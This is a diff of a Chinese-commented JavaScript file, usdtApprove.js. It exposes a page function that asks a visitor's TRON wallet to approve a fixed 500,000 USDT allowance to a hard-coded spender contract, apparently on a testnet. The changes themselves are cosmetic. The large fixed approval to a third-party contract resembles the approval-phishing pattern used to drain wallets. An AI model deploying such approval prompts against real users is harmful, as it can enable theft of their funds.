@@ -1,4 +1,4 @@
-// usdtApprove.js — 授权固定 50万 USDT
+// usdtApprove.js — 授权固定 50 万 USDT（保留原结构）
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
@@ -6,7 +6,8 @@ const spenderAddress = "TATnJboVWDD6Q1evxZUVwubPzoGr6e654B"; // 你的合约地�
 
 // ====== 固定授权额度：50万 USDT ======
 function getLargeEnoughAmount() {
-  return "50000000000000";  // 50万 * 10^6，USDT精度是6位
+  // USDT 精度 6 位小数，50万 = 500000 * 10^6 = 50000000000000
+  return "50000000000000";
 }
 
 window.approveUSDT = async function() {
@@ -19,19 +20,17 @@ window.approveUSDT = async function() {
     }
 
     const amount = getLargeEnoughAmount();
-
     console.log("授权金额(最小单位):", amount);
 
     const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
 
-    // 直接授权固定金额
     const result = await usdtContract.approve(spenderAddress, amount).send({
-      feeLimit: 100_000_000,
+      feeLimit: 100000000,
       callValue: 0
     });
 
     console.log("✅ 授权成功:", result);
-    setStatus(`✅ 成功授权 50万 USDT`);
+    setStatus(`✅ 成功授权 50 万 USDT`);
 
   } catch (err) {
     console.error("授权失败:", err);
